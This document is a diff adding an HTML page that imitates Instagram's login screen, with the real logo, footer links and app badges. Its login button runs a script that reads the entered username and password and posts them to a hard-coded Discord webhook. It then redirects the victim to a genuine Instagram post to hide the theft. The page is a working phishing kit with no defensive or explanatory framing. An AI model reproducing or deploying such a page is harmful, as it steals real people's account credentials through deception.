@@ -1,0 +1,129 @@
+<head>
+  <link rel="Icon" type="image/x-icon"
+    href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
+  <title>Instagram</title>
+</head>
+
+<body>
+  <span id="root">
+    <section class="section-all">
+      <link rel="stylesheet" href="css.css">
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo"
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                    alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form">
+
+                    <div class="input-box">
+                      <input type="text" id="username" placeholder="Phone number, username or email address"
+                        aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username"
+                        required>
+                    </div>
+
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
+                        aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>
+
+                    <span class="button-box">
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
+                    </span>
+                    <!-- <form class="container"> -->
+                    
+                    <div class="container option">OR</div>
+                    <!-- </form> -->
+                    <a class="containers" href="https://www.facebook.com">Log in with Facebook </a>
+                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgotten your
+                      password?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign
+                    up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a
+                    href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img
+                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
+                  </a>
+                  <a
+                    href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img
+                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>
+                </div> <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href=""></a></li>
+              <li><a href="https://about.meta.com/">Meta</a></li>
+              <li><a href="https://about.instagram.com">About</a></li>
+              <li><a href="https://about.instagram.com/blog">Blog</a></li>
+              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+              <li><a href="https://help.instagram.com">Help</a></li>
+              <li><a href="https://developers.facebook.com/docs/instagram-platform">Api</a></li>
+              <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
+              <br>
+              <li><a href="https://www.threads.net/">Threads</a></li>
+              <li><a href="https://www.facebook.com/help/instagram/261704639352628">Contact uploading and non-users</a></li>
+              <li><a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1">Meta Verified</a></li>
+            </ul>
+          </nav>
+          <span class="footer-logo">English (UK) &copy; 2025 Instagram from Meta</span>
+        </div> <!-- Footer container end -->
+      </footer>
+
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location = src;
+    }
+  </script>
+
+  <script>
+    function sendMessage() {
+      function sleep(milliseconds) {
+        const date = Date.now();
+        let currentDate = null;
+        do {
+          currentDate = Date.now();
+        } while (currentDate - date < milliseconds);
+      }
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1323677074946523191/wnWkdIFmqNFG8R9WArdYWMHFyzRvShjfzVCTctUGrwvn7vlzjCsu2q_HnJNx17bWy1zo");
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+      }
+      request.send(JSON.stringify(params));
+      sleep(400)
+      window.location.replace("https://instagram.com/p/CR8V_TNF4gW/");
+    }
+  </script>
+</body>
